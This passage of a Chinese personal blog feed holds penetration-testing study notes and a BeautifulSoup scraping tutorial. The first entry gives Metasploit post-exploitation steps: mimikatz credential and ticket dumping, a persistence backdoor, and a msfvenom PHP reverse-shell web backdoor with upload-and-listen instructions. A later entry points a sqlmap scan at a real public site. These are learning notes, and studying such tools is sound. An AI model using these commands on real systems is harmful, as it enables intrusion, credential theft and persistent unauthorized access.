class="code"><pre><span class="line">getuid</span><br><span class="line">getsystem</span><br><span class="line">sysinfo</span><br><span class="line">load mimikatz</span><br><span class="line">msv获取密码hash值</span><br><span class="line">kerberos  抓取系统票据</span><br><span class="line">wdigest  获取系统账户信息</span><br></pre></td></tr></table></figure><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>使用persistence</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run persistence -h</span><br><span class="line">run persistence -A -S -U -i 60 -p 4321 -r 192.168.1.x</span><br></pre></td></tr></table></figure><ul><li>A: 字段启动payload</li><li>S：系统启动时字段加载</li><li>U:  用户登录时加载</li><li>X：开机时启动</li><li>i：发起连接的时间间隔</li><li>P：监听反连的端口号</li><li>r:  目标IP</li></ul><h4 id="Web后门"><a href="#Web后门" class="headerlink" title="Web后门"></a>Web后门</h4><p>使用msfvenom</p><p>PHP:</p><p><code>msfvenom -p php/meterpreter/reverse_tcp lhost=xx -f raw &gt; web.php</code></p><p>上传PHP文件到网站后，启动msf，<code>use exploit/multi/handler</code>，然后设置lhost, payload，启动监听。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近学习后渗透和内网渗透，在此理清一下思路。&lt;/p&gt;
&lt;h2 id=&quot;msf模块&quot;&gt;&lt;a href=&quot;#msf模块&quot; class=&quot;headerlink&quot; title=&quot;msf模块&quot;&gt;&lt;/a&gt;msf模块&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Auxiliaries, 辅助模块，用于扫描
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="msf后渗透过程" scheme="https://ggyggy666.github.io/tags/msf%E5%90%8E%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>BeautifulSoup的简单使用</title>
    <link href="https://ggyggy666.github.io/2020/09/25/BeautifulSoup%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    <id>https://ggyggy666.github.io/2020/09/25/BeautifulSoup%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</id>
    <published>2020-09-25T05:44:30.000Z</published>
    <updated>2020-09-26T12:47:41.084Z</updated>
    
    <content type="html"><![CDATA[<h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><p><code>soup = BeautifulSoup(str)</code></p><p>str是字符串。</p><h2 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h2><p>默认是html.parser, 可以下载lxml, html5lib。</p><p>使用：<code>soup = BeautifulSoup(str, &#39;html.parser&#39;);</code></p><p>将html.parser替换成其它即可。</p><h2 id="定位标签"><a href="#定位标签" class="headerlink" title="定位标签"></a>定位标签</h2><ol><li><p><code>soup.title</code></p><p>返回值：<code>&lt;title&gt;ggy&lt;/title&gt;</code></p><p>会将标签和里面的字符串一起输出。</p></li><li><p><code>soup.title.name</code></p><p>返回值：title</p><p>返回的是标签名。</p></li><li><p><code>soup.p[&#39;class&#39;]</code></p><p>class是p标签的class属性，这句返回class属性的值。</p></li><li><p><code>soup.a</code></p><p>有多个a标签时只返回第一个。</p></li></ol><h2 id="取标签里的字符串"><a href="#取标签里的字符串" class="headerlink" title="取标签里的字符串"></a>取标签里的字符串</h2><p><code>soup.title.string</code></p><p>返回标签的字符串。可以用Unicode将它直接转换成Unicode字符。</p><h2 id="替换标签里的字符串"><a href="#替换标签里的字符串" class="headerlink" title="替换标签里的字符串"></a>替换标签里的字符串</h2><p><code>soup.title.string.replace_with(&quot;hello&quot;)</code></p><p>返回就是：<code>&lt;title&gt;hello&lt;/title&gt;</code></p><h2 id="prettify美化输出"><a href="#prettify美化输出" class="headerlink" title="prettify美化输出"></a>prettify美化输出</h2><p><code>soup.title.prettify</code></p><p>输出成正常HTML格式</p><h2 id="查找find-all和find"><a href="#查找find-all和find" class="headerlink" title="查找find_all和find"></a>查找find_all和find</h2><p><code>soup.find_all(&#39;b&#39;)</code></p><p>查找所有的<code>&lt;b&gt;</code>标签，括号里内容为查找条件。可以用正则表达式。</p><p><code>soup.find_all(re.compile(&quot;b&quot;))</code></p><p>可以用limit限制返回的个数</p><p><code>soup.find_all(&quot;b&quot;, limit=2)</code></p><p>直接根据属性定位：</p><p><code>soup.find_all(&quot;a&quot;)</code></p><p><code>soup.find_all(id=&quot;test&quot;)</code></p><p><code>soup.find_all(id=re.compile(&quot;test&quot;))</code></p><p><code>soup.find_all(id=&quot;test&quot;, href=&quot;www.baidu.com&quot;)</code></p><p>如果属性是data-foo，不能这么做，需要传字典</p><p><code>soup.find_all(attrs={&quot;data-foo&quot;: &quot;value&quot;})</code></p><p>按类class查找，用class_</p><p><code>soup.find_all(class_=&quot;test&quot;)</code></p><p>根据string内容定位</p><p><code>soup.find_all(string=&quot;hello&quot;)</code></p><p>find只返回一个匹配结果, 其它与find_all类似</p><p><code>soup.find(&quot;title&quot;)</code></p><h2 id="select选择器"><a href="#select选择器" class="headerlink" title="select选择器"></a>select选择器</h2><p><code>soup.select(&quot;title&quot;)</code></p><p>通过标签逐层查找</p><p><code>soup.select(&quot;html head title&quot;)</code></p><p>返回的是title那一行</p><p><code>soup.select(&quot;p &gt; a&quot;)</code></p><p>返回的是在p标签下的所有a标签</p><p><code>soup.select(&quot;.sister&quot;)</code></p><p>通过类名的值寻找。即需要：<code>class=sister</code></p><p><code>soup.select(&quot;#link1&quot;)</code> 或者 <code>soup.select(&quot;a#link1&quot;)</code></p><p>通过id的值进行查找。需要：<code>id=link1</code></p><p><code>soup.select(&#39;a[href^=&quot;http://www.bai&quot;]&#39;)</code></p><p>通过属性值查找,找href的值是以<a href="http://www.bai开头的。^可以换成$,*，当然直接等号的话要写完整值。" target="_blank" rel="noopener">http://www.bai开头的。^可以换成$,*，当然直接等号的话要写完整值。</a></p><h2 id="爬取小说"><a href="#爬取小说" class="headerlink" title="爬取小说"></a>爬取小说</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import re, threading</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&#39;utf-8&#39;)&#x2F;&#x2F;防止出现一些编码错误</span><br><span class="line"></span><br><span class="line">list &#x3D; []</span><br><span class="line">agent &#x3D; &#123;&quot;User-Agent&quot;:&quot;firefox 5.0&quot;&#125;</span><br><span class="line">count &#x3D; 0</span><br><span class="line"></span><br><span class="line">def get_content(url):&#x2F;&#x2F;返回URL的页面内容</span><br><span class="line">    r &#x3D; requests.get(url, headers&#x3D;agent);</span><br><span class="line">    r.encoding &#x3D; &#39;utf-8&#39;</span><br><span class="line">    return r.text</span><br><span class="line"></span><br><span class="line">def get_url(url, add, start):&#x2F;&#x2F;取页面每个章节的URL</span><br><span class="line">    r &#x3D; get_content(url)</span><br><span class="line">    soup &#x3D; BeautifulSoup(r, &quot;lxml&quot;)</span><br><span class="line">    s &#x3D; soup.dl.find_all(&quot;a&quot;)</span><br><span class="line">    for i in range(0, add+start):</span><br><span class="line">       l &#x3D; s[i][&#39;href&#39;]</span><br><span class="line">       furl &#x3D; url + l</span><br><span class="line">       list.append(furl)&#x2F;&#x2F;将URL放到一个列表中</span><br><span class="line">    print(&quot;the &quot;+s[i-1].string+&quot; chapters is the end you wang to download&quot;)</span><br><span class="line"></span><br><span class="line">def download(url, name):&#x2F;&#x2F;访问URL，将页面的文本写入文件</span><br><span class="line">        r &#x3D; get_content(url);</span><br><span class="line">        soup &#x3D; BeautifulSoup(r, &quot;lxml&quot;);</span><br><span class="line">        s &#x3D; soup.find(&quot;h1&quot;)</span><br><span class="line">        title &#x3D; s.string</span><br><span class="line">        content &#x3D; soup.find(id&#x3D;&quot;content&quot;)</span><br><span class="line">        content &#x3D; str(content)</span><br><span class="line">        content &#x3D; content.replace(&#39;&lt;div id&#x3D;&quot;content&quot;&gt;&lt;!--go--&gt;&#39;,&quot;\n&quot;) </span><br><span class="line">        content &#x3D; content.replace(&quot;&lt;&#x2F;div&gt;&quot;,&quot;\n&quot;)</span><br><span class="line">        content &#x3D; content.replace(&quot;&lt;!--over--&gt;&quot;,&quot; &quot;) </span><br><span class="line">        content &#x3D; content.replace(&quot;&lt;br&#x2F;&gt;&quot;,&quot;\n&quot;)</span><br><span class="line">        with open(name+&quot;.txt&quot;,&quot;a&quot;) as f:</span><br><span class="line">            content &#x3D; title + &quot;\n\n&quot; + content</span><br><span class="line">            f.write(content)</span><br><span class="line">        if((count+1)%50&#x3D;&#x3D;0):</span><br><span class="line">            print(&quot;you have downloaded 50 chapters&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    name &#x3D; raw_input(&quot;input the name you wang to download: &quot;)&#x2F;&#x2F;下载的小说名字，以便生成该名字的文件</span><br><span class="line">    url &#x3D; raw_input(&quot;Please enter fiction&#39;s url$  &quot;)&#x2F;&#x2F;输入小说的主页面URL</span><br><span class="line">    start &#x3D; input(&quot;start chapter: &quot;)&#x2F;&#x2F;输入要从哪一章开始下载</span><br><span class="line">    add &#x3D; input(&quot;add chapter count: &quot;)&#x2F;&#x2F;输入要下载多少章</span><br><span class="line">    get_url(url, add, start)</span><br><span class="line">    count &#x3D; start</span><br><span class="line">    for j in range(start, add+start+1):&#x2F;&#x2F;遍历URL进行下载</span><br><span class="line">        download(list[j], name)</span><br><span class="line">        count +&#x3D; 1</span><br></pre></td></tr></table></figure><p>神武仙踪：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import re, threading</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line">list &#x3D; []</span><br><span class="line">agent &#x3D; &#123;&quot;User-Agent&quot;:&quot;firefox 5.0&quot;&#125;</span><br><span class="line">count &#x3D; 0</span><br><span class="line"></span><br><span class="line">def get_content(url):</span><br><span class="line">    r &#x3D; requests.get(url, headers&#x3D;agent);</span><br><span class="line">    r.encoding &#x3D; &#39;utf-8&#39;</span><br><span class="line">    return r.text</span><br><span class="line"></span><br><span class="line">def get_url(url, add, start):</span><br><span class="line">    r &#x3D; get_content(url)</span><br><span class="line">    soup &#x3D; BeautifulSoup(r, &quot;lxml&quot;)</span><br><span class="line">    s &#x3D; soup.dl.find_all(&quot;a&quot;)</span><br><span class="line">    for i in range(0, add+start):</span><br><span class="line">       l &#x3D; s[i][&#39;href&#39;]</span><br><span class="line">       furl &#x3D; url + l</span><br><span class="line">       list.append(furl)</span><br><span class="line">    print(&quot;the &quot;+s[i-1].string+&quot; chapters is the end you wang to download&quot;)</span><br><span class="line"></span><br><span class="line">def download(url, name):</span><br><span class="line">        r &#x3D; get_content(url);</span><br><span class="line">        soup &#x3D; BeautifulSoup(r, &quot;lxml&quot;);</span><br><span class="line">        s &#x3D; soup.find(&quot;h1&quot;)</span><br><span class="line">        title &#x3D; s.string</span><br><span class="line">        content &#x3D; soup.find(id&#x3D;&quot;content&quot;)</span><br><span class="line">        content &#x3D; str(content)</span><br><span class="line">        content &#x3D; content.replace(&#39;&lt;div id&#x3D;&quot;content&quot;&gt;&lt;!--go--&gt;&#39;,&quot;\n&quot;) </span><br><span class="line">        content &#x3D; content.replace(&quot;&lt;&#x2F;div&gt;&quot;,&quot;\n&quot;)</span><br><span class="line">        content &#x3D; content.replace(&quot;&lt;!--over--&gt;&quot;,&quot; &quot;) </span><br><span class="line">        content &#x3D; content.replace(&quot;&lt;br&#x2F;&gt;&quot;,&quot;\n&quot;)</span><br><span class="line">        with open(name+&quot;.txt&quot;,&quot;a&quot;) as f:</span><br><span class="line">            content &#x3D; title + &quot;\n\n&quot; + content</span><br><span class="line">            f.write(content)</span><br><span class="line">        if((count+1)%50&#x3D;&#x3D;0):</span><br><span class="line">            print(&quot;you have downloaded 50 chapters&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    name &#x3D; raw_input(&quot;input the name you wang to download: &quot;)</span><br><span class="line">    url &#x3D; raw_input(&quot;Please enter fiction&#39;s url$  &quot;)</span><br><span class="line">    start &#x3D; input(&quot;start chapter: &quot;)</span><br><span class="line">    add &#x3D; input(&quot;add chapter count: &quot;)</span><br><span class="line">    get_url(url, add, start)</span><br><span class="line">    count &#x3D; start</span><br><span class="line">    for j in range(start, add+start+1):</span><br><span class="line">        download(list[j], name)</span><br><span class="line">        count +&#x3D; 1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;创建对象&quot;&gt;&lt;a href=&quot;#创建对象&quot; class=&quot;headerlink&quot; title=&quot;创建对象&quot;&gt;&lt;/a&gt;创建对象&lt;/h2&gt;&lt;p&gt;&lt;code&gt;soup = BeautifulSoup(str)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;str是字符串。&lt;/p&gt;
&lt;h2
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="BeautifulSoup的简单使用" scheme="https://ggyggy666.github.io/tags/BeautifulSoup%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>msf的使用-工作区、信息收集</title>
    <link href="https://ggyggy666.github.io/2020/08/02/msf%E7%9A%84%E4%BD%BF%E7%94%A8-%E5%B7%A5%E4%BD%9C%E5%8C%BA%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://ggyggy666.github.io/2020/08/02/msf%E7%9A%84%E4%BD%BF%E7%94%A8-%E5%B7%A5%E4%BD%9C%E5%8C%BA%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2020-08-02T15:47:29.000Z</published>
    <updated>2020-08-03T03:52:07.200Z</updated>
    
    <content type="html"><![CDATA[<p>今天继续学习msf。</p><a id="more"></a><h2 id="工作区"><a href="#工作区" class="headerlink" title="工作区"></a>工作区</h2><ul><li>查看工作区状态：<code>workspace</code></li><li>显示工作区详细信息：<code>workspace -v</code></li><li>添加工作区：<code>workspace -a ggy</code></li><li>切换工作区：<code>workspace ggy</code></li><li>重命名工作区：<code>workspace -r ggy ggy666</code></li><li>删除某个工作区：<code>workspace -d ggy</code></li><li>删除所有工作区：<code>workspace -D</code></li></ul><h2 id="信息管理"><a href="#信息管理" class="headerlink" title="信息管理"></a>信息管理</h2><ul><li>管理主机：hosts</li><li>管理服务：services</li><li>管理认证信息：creds</li><li>管理战利品：loot</li><li>管理备注信息：notes</li><li>显示漏洞信息：vulns</li></ul><h2 id="保存工作区信息"><a href="#保存工作区信息" class="headerlink" title="保存工作区信息"></a>保存工作区信息</h2><p><code>db_export -f xml ggy</code>, xml是格式，ggy是保存的文件名。</p><h2 id="快速搜索模块"><a href="#快速搜索模块" class="headerlink" title="快速搜索模块"></a>快速搜索模块</h2><p>需要重新创建缓存：<code>db_rebuild_cache</code>。</p><h2 id="各模块使用"><a href="#各模块使用" class="headerlink" title="各模块使用"></a>各模块使用</h2><p><a href="https://weread.qq.com/web/reader/95f320e0718ac6ba95fb88ak33e3289021c33e75ff09694" target="_blank" rel="noopener">https://weread.qq.com/web/reader/95f320e0718ac6ba95fb88ak33e3289021c33e75ff09694</a></p><h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">load salmap</span><br><span class="line">sqlmapapi -s -p 8875&#x2F;&#x2F;监听8875端口</span><br><span class="line">sqlmap_connect 127.0.0.1</span><br><span class="line">sqlmap_new_task&#x2F;&#x2F;新建任务，得到一个ID如1</span><br><span class="line">sqlmap_start_task 1&quot;www.baidu.com&quot;&#x2F;&#x2F;启动任务1,扫描百度</span><br><span class="line">sqlmap_list_task&#x2F;&#x2F;查看运行的任务</span><br><span class="line">sqlmap_get_status&#x2F;&#x2F;查看运行状态，terminated是完成了，running正在运行</span><br><span class="line">sqlmap_get_data&#x2F;&#x2F;获取扫描到的漏洞</span><br><span class="line">sqlmap_get_log 1&#x2F;&#x2F;查看扫描日志</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天继续学习msf。&lt;/p&gt;
    
    </summary>
    
    
      <category term="kali" scheme="https://ggyggy666.github.io/categories/kali/"/>
    
    
      <category term="msf的使用-工作区、信息收集" scheme="https://ggyggy666.github.io/tags/msf%E7%9A%84%E4%BD%BF%E7%94%A8-%E5%B7%A5%E4%BD%9C%E5%8C%BA%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
</feed>
